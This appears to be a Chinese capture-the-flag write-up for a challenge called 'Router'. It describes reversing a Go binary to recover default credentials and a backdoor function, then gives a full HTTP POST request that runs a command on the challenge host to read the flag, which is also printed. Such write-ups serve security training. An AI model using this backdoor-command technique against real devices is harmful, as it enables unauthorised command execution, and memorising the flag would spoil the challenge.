# Router

## 思路分析

> 根据题目提示,下载附件,是一个elf文件,strings之后发现这是一个go打包的程序,这道题考察的就是二进制逆向了.执行这个二进制程序后,发现会生成一个settings.config文件,但是发现无法直接读取,在网页上,进行fuzz,发现也存在一个export.php页面,访问也可以得到一个无法直接读取的settings.config页面,考虑这是该路由器的配置文件.

> 扔进IDA进行分析,使用ida python脚本恢复go的符号表,脚本地址: https://github.com/sibears/IDAGolangHelper/

> 恢复符号表后,在string中查找config,发现一个字符串,应该就是config文件加载完成后的提示,直接跟进去,找到调用位置,4013BD

> 将文件使用gdb进行调试,在0x4013BD处下个断点,然后运行,栈中找到用户名和密码都为router

> 发现了一个名为main_Backdoor的函数,页面登陆后,有一些功能,一些数据包POST了action参数,可以利用这个backdoor执行任意命令

## payload

```
POST /4f86ad02c5734e3ffdb3371a919a86cd HTTP/1.1
Host: 61.147.171.105:57262
Content-Length: 46
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://61.147.171.105:57262
Referer: http://61.147.171.105:57262/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=w4z0he0g0vta9fexmjey6agba6giitan
Connection: close

action=execute&command=cat /home/xctf/bin/flag
```

## flag

> cyberpeace{5163c539d3d88416b0578bb9e6ea5db1}

## 参考

> https://www.freebuf.com/articles/web/239385.html